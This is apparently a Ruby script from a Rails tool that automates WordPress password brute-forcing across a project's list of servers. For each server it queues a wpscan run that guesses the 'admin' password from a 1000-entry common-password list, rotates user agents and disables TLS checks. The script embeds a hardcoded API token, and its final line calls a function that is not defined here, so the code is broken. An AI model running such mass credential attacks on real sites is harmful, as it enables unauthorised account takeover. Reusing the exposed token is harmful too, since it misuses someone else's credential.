ENV['RAILS_ENV'] = 'production'
require File.expand_path(File.dirname(__FILE__) + "/../config/environment")
require 'rails'
require 'rubygems'
require 'httparty'

def run servers

  servers.each do |server|
    site_url = "#{server.protocal}://#{server.name}"

    # 1. 确认该站点存活（ehole)
    #
    #response = HTTPary.get site_url
    # 2. 确认站点用户
    # 3. 生成对应的密码  自定义fuzz + xato 前1000, 保存为临时密码文件
    # 4. 执行wpscan , 保存结果到数据库

    command = "wpscan --url #{server.protocal}://#{server.name} --usernames admin --passwords /usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt --api-token JyrztKLFjKYaAmPX6cUoFX2AWquTqZxaNBtacVPwjUo --random-user-agent --no-update --disable-tls-checks --connect-timeout 5 --request-timeout 5 "

    RunJob.perform_later command: command, result_column: 'wpscan_result',
      is_detected_by_column: 'is_detected_by_wpscan',
      entity: server
  end
end

get_wafw00f_result_by_domains Server.where('project_id = ?', ARGV[0])
